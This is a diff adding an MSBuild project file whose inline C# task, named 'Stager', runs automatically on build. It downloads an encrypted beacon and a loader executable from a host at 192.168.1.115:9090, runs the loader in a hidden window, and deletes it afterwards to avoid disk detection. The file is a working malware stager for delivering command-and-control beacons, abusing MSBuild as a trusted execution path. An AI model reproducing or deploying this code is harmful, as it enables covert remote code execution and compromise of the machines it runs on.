@@ -1,0 +1,74 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" DefaultTargets="Execute">
+  <UsingTask TaskName="Stager" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System" />
+      <Reference Include="System.Net" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+          using System;
+          using System.Net;
+          using System.IO;
+          using System.Diagnostics;
+          using Microsoft.Build.Framework;
+          using Microsoft.Build.Utilities;
+
+          public class Stager : Task
+          {
+              public override bool Execute()
+              {
+                  try
+                  {
+                      string tempPath = Path.GetTempPath();
+                      string encryptedBeaconPath = Path.Combine(tempPath, "enc.bin");
+                      string loaderPath = Path.Combine(tempPath, "loader.exe");
+
+                      Log.LogMessage(MessageImportance.High, "[*] Downloading encrypted beacon...");
+                      using (WebClient wc = new WebClient())
+                      {
+                          byte[] encryptedBeacon = wc.DownloadData("http://192.168.1.115:9090/encrypted.bin");
+                          File.WriteAllBytes(encryptedBeaconPath, encryptedBeacon);
+                          Log.LogMessage(MessageImportance.High, "[+] Beacon saved to: " + encryptedBeaconPath);
+                      }
+
+                      Log.LogMessage(MessageImportance.High, "[*] Downloading loader...");
+                      using (WebClient wc = new WebClient())
+                      {
+                          byte[] loader = wc.DownloadData("http://192.168.1.115:9090/loader.exe");
+                          File.WriteAllBytes(loaderPath, loader);
+                          Log.LogMessage(MessageImportance.High, "[+] Loader saved to: " + loaderPath);
+                      }
+
+                      Log.LogMessage(MessageImportance.High, "[*] Executing loader...");
+                      Process process = new Process();
+                      process.StartInfo.FileName = loaderPath;
+                      process.StartInfo.WorkingDirectory = tempPath;
+                      process.StartInfo.CreateNoWindow = true;
+                      process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                      process.Start();
+
+                      Log.LogMessage(MessageImportance.High, "[+] Loader executed (PID: " + process.Id + ")");
+
+                      // Optional: Wait a bit and clean up
+                      System.Threading.Thread.Sleep(5000);
+
+                      // Clean up files to avoid disk detection
+                      try { File.Delete(loaderPath); } catch { }
+                      // Keep enc.bin for the loader to read, loader will delete it after decryption
+
+                      return true;
+                  }
+                  catch (Exception ex)
+                  {
+                      Log.LogMessage(MessageImportance.High, "[!] Error: " + ex.Message);
+                      return false;
+                  }
+              }
+          }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+  <Target Name="Execute">
+    <Stager />
+  </Target>
+</Project>
